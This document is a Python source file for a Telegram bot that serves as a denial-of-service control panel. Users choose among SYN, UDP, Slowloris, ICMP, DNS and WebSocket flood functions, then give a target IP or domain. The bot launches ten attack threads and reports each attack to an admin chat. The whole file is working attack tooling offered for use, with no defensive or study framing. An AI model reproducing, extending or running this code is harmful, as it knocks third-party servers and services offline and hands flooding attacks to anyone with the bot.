import telebot
import subprocess
import socket
import sys
import random
import threading
import time
from scapy.all import IP, TCP, UDP, ICMP, send, raw
from telebot import types
import os

TOKEN = ""
ADMIN_CHAT_ID = ""
MAX_PACKETS = 1000000

bot = telebot.TeleBot(TOKEN)
user_attacks = {}

ATTACK_METHODS = {
    "1": "SYN Flood (Layer 4 Tsunami)",
    "2": "UDP Amplification (Bandwidth Annihilator)",
    "3": "HTTP Slowloris (Connection Strangler)",
    "4": "ICMP Ping Storm (Packet Hurricane)",
    "5": "DNS Water Torture (NXDomain Overload)",
    "6": "WebSocket Armageddon (Layer 7 Apocalypse)"
}


# ===== ATTACK FUNCTIONS =====

def syn_flood(target_ip, target_port):
    """TCP SYN Flood"""
    thread_id = threading.current_thread().name
    print(f"[SYN FLOOD] Thread {thread_id} STARTED → {target_ip}:{target_port}")
    packet_count = 0
    while packet_count < MAX_PACKETS:
        try:
            ip = IP(dst=target_ip)
            tcp = TCP(
                sport=random.randint(1024, 65535),
                dport=target_port,
                flags="S",
                seq=random.randint(0, 4294967295),
                window=64240
            )
            send(ip / tcp, verbose=0)
            packet_count += 1

            # Print every 100 packets
            if packet_count % 100 == 0:
                print(f"[SYN FLOOD] Thread {thread_id} | "
                      f"Packets sent: {packet_count} → {target_ip}:{target_port}")

        except Exception as e:
            print(f"[SYN FLOOD] Thread {thread_id} ERROR: {str(e)}", file=sys.stderr)
            break

    print(f"[SYN FLOOD] Thread {thread_id} FINISHED | Total packets: {packet_count}")


def udp_amplification(target_ip, target_port=53):
    """UDP flood attack vector"""
    thread_id = threading.current_thread().name
    print(f"[UDP FLOOD] Thread {thread_id} STARTED → {target_ip}:{target_port}")
    packet_count = 0
    while packet_count < MAX_PACKETS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = bytes(random.getrandbits(8) for _ in range(1024))
            sock.sendto(payload, (target_ip, target_port))
            sock.close()
            packet_count += 1

            # Print every 500 packets
            if packet_count % 500 == 0:
                print(f"[UDP FLOOD] Thread {thread_id} | "
                      f"Packets sent: {packet_count} | "
                      f"Payload size: 1024 bytes → {target_ip}:{target_port}")

        except Exception as e:
            print(f"[UDP FLOOD] Thread {thread_id} ERROR: {str(e)}", file=sys.stderr)
            break

    print(f"[UDP FLOOD] Thread {thread_id} FINISHED | Total packets: {packet_count}")


def slowloris(target_ip, target_port=80):
    """Slow HTTP Denial of Service"""
    thread_id = threading.current_thread().name
    print(f"[SLOWLORIS] Thread {thread_id} STARTED → {target_ip}:{target_port}")
    sockets_list = []
    max_sockets = 200

    # Phase 1: Create connections
    print(f"[SLOWLORIS] Thread {thread_id} | Creating {max_sockets} connections...")
    for i in range(max_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            s.send("Connection: keep-alive\r\n".encode())
            sockets_list.append(s)

            if (i + 1) % 50 == 0:
                print(f"[SLOWLORIS] Thread {thread_id} | "
                      f"Connections opened: {i + 1}/{max_sockets}")

        except Exception as e:
            print(f"[SLOWLORIS] Thread {thread_id} | "
                  f"Connection {i + 1} failed: {str(e)}", file=sys.stderr)

    print(f"[SLOWLORIS] Thread {thread_id} | "
          f"Total active connections: {len(sockets_list)}")

    # Phase 2: Keep alive
    keep_alive_rounds = 100
    for round_num in range(keep_alive_rounds):
        print(f"[SLOWLORIS] Thread {thread_id} | "
              f"Keep-alive round {round_num + 1}/{keep_alive_rounds} | "
              f"Active sockets: {len(sockets_list)}")

        for s in list(sockets_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except Exception:
                sockets_list.remove(s)
                try:
                    new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_s.settimeout(4)
                    new_s.connect((target_ip, target_port))
                    new_s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                    new_s.send(f"Host: {target_ip}\r\n".encode())
                    sockets_list.append(new_s)
                except Exception:
                    pass
        time.sleep(10)

    # Cleanup
    for s in sockets_list:
        try:
            s.close()
        except Exception:
            pass
    print(f"[SLOWLORIS] Thread {thread_id} FINISHED | All connections closed")


def icmp_ping_storm(target_ip, target_port=0):
    """Ping flood"""
    thread_id = threading.current_thread().name
    count = 100
    print(f"[ICMP PING] Thread {thread_id} STARTED → {target_ip} | {count} pings")
    try:
        if sys.platform == "win32":
            cmd = ["ping", target_ip, "-n", str(count), "-w", "1000"]
        else:
            cmd = ["ping", target_ip, "-c", str(count), "-W", "1"]

        print(f"[ICMP PING] Thread {thread_id} | Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)

        # Print ping output summary
        output_lines = result.stdout.strip().split('\n')
        for line in output_lines[-4:]:  # Last 4 lines have statistics
            if line.strip():
                print(f"[ICMP PING] Thread {thread_id} | {line.strip()}")

    except subprocess.CalledProcessError as e:
        print(f"[ICMP PING] Thread {thread_id} ERROR: {e}", file=sys.stderr)
    except FileNotFoundError:
        print(f"[ICMP PING] Thread {thread_id} ERROR: ping command not found",
              file=sys.stderr)

    print(f"[ICMP PING] Thread {thread_id} FINISHED")


def dns_nxdomain_attack(target_ip, target_port=53):
    """DNS query flood"""
    thread_id = threading.current_thread().name
    print(f"[DNS FLOOD] Thread {thread_id} STARTED → {target_ip}")
    query_count = 0
    max_queries = 10000
    while query_count < max_queries:
        try:
            random_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
            query = f"{random_sub}.{target_ip}"
            subprocess.run(
                ["nslookup", query],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
            query_count += 1

            # Print every 100 queries
            if query_count % 100 == 0:
                print(f"[DNS FLOOD] Thread {thread_id} | "
                      f"Queries sent: {query_count}/{max_queries} | "
                      f"Last query: {query}")

        except subprocess.TimeoutExpired:
            print(f"[DNS FLOOD] Thread {thread_id} | Query timeout: {query}")
            continue
        except Exception as e:
            print(f"[DNS FLOOD] Thread {thread_id} ERROR: {str(e)}", file=sys.stderr)
            break

    print(f"[DNS FLOOD] Thread {thread_id} FINISHED | Total queries: {query_count}")


def websocket_apocalypse(target_ip, target_port=80):
    """WebSocket connection flood"""
    thread_id = threading.current_thread().name
    print(f"[WEBSOCKET] Thread {thread_id} STARTED → {target_ip}:{target_port}")

    try:
        from websocket import create_connection
    except ImportError:
        print(f"[WEBSOCKET] Thread {thread_id} ERROR: "
              f"websocket-client not installed. Run: pip install websocket-client",
              file=sys.stderr)
        return

    count = 0
    max_connections = 1000
    while count < max_connections:
        try:
            ws = create_connection(f"ws://{target_ip}:{target_port}/", timeout=5)
            ws.send("0" * 1024 * 1024)
            ws.close()
            count += 1

            # Print every 50 connections
            if count % 50 == 0:
                print(f"[WEBSOCKET] Thread {thread_id} | "
                      f"Connections made: {count}/{max_connections} | "
                      f"Payload: 1MB each")

        except Exception as e:
            print(f"[WEBSOCKET] Thread {thread_id} | Connection failed: {str(e)}",
                  file=sys.stderr)
            time.sleep(0.1)

    print(f"[WEBSOCKET] Thread {thread_id} FINISHED | Total connections: {count}")


# ===== FUNCTION MAP =====
attack_functions = {
    '1': lambda ip, port: syn_flood(ip, port),
    '2': lambda ip, port: udp_amplification(ip, port),
    '3': lambda ip, port: slowloris(ip, port),
    '4': lambda ip, port: icmp_ping_storm(ip, port),
    '5': lambda ip, port: dns_nxdomain_attack(ip, port),
    '6': lambda ip, port: websocket_apocalypse(ip, port)
}

DEFAULT_PORTS = {
    '1': 80,
    '2': 53,
    '3': 80,
    '4': 0,
    '5': 53,
    '6': 80
}


def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


# ===== TELEGRAM HANDLERS =====

@bot.message_handler(commands=['start'])
def show_attack_menu(message):
    print(f"\n[BOT] /start command received from user {message.from_user.id}")
    markup = types.InlineKeyboardMarkup(row_width=2)
    for num, desc in ATTACK_METHODS.items():
        markup.add(types.InlineKeyboardButton(
            f"{num}. {desc}",
            callback_data=f"attack_{num}")
        )
    bot.send_message(
        message.chat.id,
        "<b>⚡ PHREAK'S OFFENSIVE CONTROL PANEL ⚡</b>\n"
        "Select attack vector:\n\n"
        "1. SYN: TCP connection exhaustion\n"
        "2. UDP: Bandwidth amplification\n"
        "3. Slowloris: HTTP connection starvation\n"
        "4. ICMP: Ping flood overload\n"
        "5. DNS: Recursive query bombardment\n"
        "6. WS: WebSocket protocol abuse",
        parse_mode='HTML',
        reply_markup=markup
    )
    print(f"[BOT] Attack menu sent to user {message.from_user.id}")


@bot.callback_query_handler(func=lambda call: call.data.startswith('attack_'))
def set_attack_method(call):
    method_id = call.data.split('_')[1]
    if method_id not in ATTACK_METHODS:
        bot.send_message(call.message.chat.id, "❌ Invalid method!")
        print(f"[BOT] Invalid method selected: {method_id}")
        return

    user_attacks[call.message.chat.id] = {'method': method_id}
    bot.answer_callback_query(call.id, "Method selected!")

    print(f"\n[BOT] User {call.from_user.id} selected: {ATTACK_METHODS[method_id]}")

    bot.send_message(
        call.message.chat.id,
        f"⛔ {ATTACK_METHODS[method_id]} SELECTED\n\n"
        "📌 Send target in one of these formats:\n"
        "• <code>IP</code>  (uses default port)\n"
        "• <code>IP PORT</code>\n"
        "• <code>domain.com</code>\n"
        "• <code>domain.com PORT</code>\n\n"
        "Example: <code>192.168.1.1 80</code>",
        parse_mode='HTML'
    )


@bot.message_handler(func=lambda m: m.chat.id in user_attacks)
def execute_attack(message):
    chat_id = message.chat.id
    user_input = message.text.strip()

    if user_input.startswith('/'):
        return

    try:
        method_id = user_attacks[chat_id]['method']

        # Parse input
        parts = user_input.split()
        print(f"\n[BOT] {'='*50}")
        print(f"[BOT] ATTACK REQUEST RECEIVED")
        print(f"[BOT] User: {message.from_user.id}")
        print(f"[BOT] Raw input: '{user_input}'")
        print(f"[BOT] Parsed parts: {parts}")

        if len(parts) == 1:
            target_host = parts[0]
            target_port = DEFAULT_PORTS.get(method_id, 80)
            print(f"[BOT] No port specified, using default: {target_port}")

        elif len(parts) == 2:
            target_host = parts[0]
            try:
                target_port = int(parts[1])
                if not (1 <= target_port <= 65535):
                    bot.send_message(chat_id, "❌ Port must be between 1-65535")
                    print(f"[BOT] ERROR: Invalid port range: {target_port}")
                    return
            except ValueError:
                bot.send_message(chat_id, "❌ Invalid port number!\n"
                                          "Use format: <code>IP PORT</code>",
                                 parse_mode='HTML')
                print(f"[BOT] ERROR: Port is not a number: '{parts[1]}'")
                return
        else:
            bot.send_message(chat_id, "❌ Invalid format!\n"
                                      "Use: <code>IP PORT</code> or just <code>IP</code>",
                             parse_mode='HTML')
            print(f"[BOT] ERROR: Too many parts in input: {parts}")
            return

        # Resolve hostname
        if is_valid_ip(target_host):
            target_ip = target_host
            print(f"[BOT] Valid IP address: {target_ip}")
        else:
            try:
                print(f"[BOT] Resolving hostname: {target_host}...")
                target_ip = socket.gethostbyname(target_host)
                print(f"[BOT] Resolved to: {target_ip}")
            except socket.gaierror:
                bot.send_message(chat_id, f"❌ Cannot resolve hostname: {target_host}")
                print(f"[BOT] ERROR: DNS resolution failed for: {target_host}")
                del user_attacks[chat_id]
                return

        print(f"[BOT] Method: {ATTACK_METHODS[method_id]}")
        print(f"[BOT] Target: {target_ip}:{target_port}")
        print(f"[BOT] Launching 10 threads...")
        print(f"[BOT] {'='*50}")

        bot.send_message(
            chat_id,
            f"🚀 LAUNCHING {ATTACK_METHODS[method_id]}\n"
            f"🎯 Target: <code>{target_ip}</code>\n"
            f"🔌 Port: <code>{target_port}</code>\n"
            f"🧵 Threads: 10",
            parse_mode='HTML'
        )

        # Launch threads
        for i in range(10):
            t = threading.Thread(
                target=attack_functions[method_id],
                args=(target_ip, target_port),
                daemon=True,
                name=f"Attack-{i+1}"
            )
            t.start()
            print(f"[BOT] ✅ Thread Attack-{i+1} launched")

        print(f"\n[BOT] 🚀 ALL 10 THREADS LAUNCHED SUCCESSFULLY!")
        print(f"[BOT] Active threads: {threading.active_count()}")

        bot.send_message(
            ADMIN_CHAT_ID,
            f"☠️ ATTACK DEPLOYED ☠️\n"
            f"Method: {ATTACK_METHODS[method_id]}\n"
            f"Target: {target_ip}:{target_port}\n"
            f"Origin: {message.from_user.id}"
        )

    except Exception as e:
        bot.send_message(chat_id, f"💥 ERROR: {str(e)}")
        print(f"[BOT] ❌ ATTACK ERROR: {str(e)}", file=sys.stderr)
    finally:
        if chat_id in user_attacks:
            del user_attacks[chat_id]
            print(f"[BOT] User {chat_id} state cleaned up")


# ===== MAIN =====
if __name__ == "__main__":
    print("=" * 60)
    print("   DDOS-Telegram-BOT v2 - STARTING UP")
    print("=" * 60)

    try:
        bot_info = bot.get_me()
        print(f"[STARTUP] ✅ Bot connected: @{bot_info.username}")
        print(f"[STARTUP] ✅ Admin Chat ID: {ADMIN_CHAT_ID}")
        print(f"[STARTUP] ✅ Attack methods loaded: {len(ATTACK_METHODS)}")
        print(f"[STARTUP] ✅ Waiting for commands...")
        print("=" * 60)
    except Exception as e:
        print(f"[STARTUP] ❌ FATAL: Cannot connect to Telegram: {e}")
        sys.exit(1)

    bot.infinity_polling(timeout=60, long_polling_timeout=30)